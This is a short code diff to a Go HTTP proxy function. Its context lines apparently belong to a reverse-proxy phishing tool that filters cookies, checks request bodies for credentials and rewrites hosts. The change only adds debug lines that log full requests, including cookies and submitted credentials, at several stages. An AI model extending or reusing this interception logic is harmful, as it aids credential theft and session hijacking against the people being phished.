@@ -642,7 +642,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			        for _, cookie := range filteredCookies {
 			            req.AddCookie(cookie)
 			        }
-
+				log.Info("Request After Checkers: %v", req)
 				// prevent caching
 				req.Header.Set("Cache-Control", "no-cache")
 
@@ -677,7 +677,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.URL.RawQuery = qs.Encode()
 					}
 				}
-
+				log.Info("Request Before Cred check: %v", req)
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
 					req.Header.Set(p.getHomeDir(), o_host)
@@ -733,7 +733,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 							}
-
+							log.Info("Request Before Forec Post: %v", req)
 							// force post json
 							for _, fp := range pl.forcePost {
 								if fp.path.MatchString(req.URL.Path) {
@@ -873,7 +873,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
-
+				log.Info("Request Before Intercept: %v", req)
 				// check if request should be intercepted
 				if pl != nil {
 					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -899,7 +899,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 				}
-			log.Info("Request After: %v", req)
+			log.Info("Request Final: %v", req)
 			return req, nil
 		})
 
